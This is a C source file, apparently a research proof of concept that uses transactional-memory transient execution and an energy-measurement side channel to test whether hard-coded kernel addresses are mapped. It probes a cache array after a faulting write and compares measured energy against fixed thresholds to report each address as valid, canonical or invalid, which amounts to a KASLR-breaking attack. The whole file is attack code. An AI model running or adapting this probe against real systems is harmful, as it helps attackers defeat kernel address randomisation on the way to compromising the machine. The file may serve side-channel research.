#include "../measure/measure.h"

#include <memory.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <sys/time.h>
#include "cacheutils.h"
#include <sched.h>

#define Threshold1 1251001039
#define Threshold2 3030115687
#define TRIES 50000

int main() {

char mem[256 * 4096];
memset(mem, 1, sizeof(mem));
char* victim = (char*)0xffffffff9bf00000;
char* attacker = (char*)0xffffffff9bb00000;


  char buffer[200];

  // init the measurement library
  init();

  // average N runs
  int N = 50000;
  
  // measure the start "stamp"
  Measurement start = measure();

  for(int i=0; i<1000000; i++){
       if (try_start()) {

      *(victim) = 'b'; 

      maccess(mem +  victim[0] * 4096);
 
     try_abort();

      }

      try_end();  
 }

  // measure the end "stamp"
  Measurement stop = measure();

  // convert the differential readings into a sample
  Sample sample = convert(start, stop);

  // print the message
  puts(buffer);
  // print the sample
  print(sample); 
  
  
  
  if(sample.energy<Threshold1){
printf("%p is valid & canonical\n",victim);
}
 else if(sample.energy>Threshold2){
printf("%p is invalid & non-canonical\n",victim);
}
else{


printf("%p is invalid\n",victim);


}
  
}


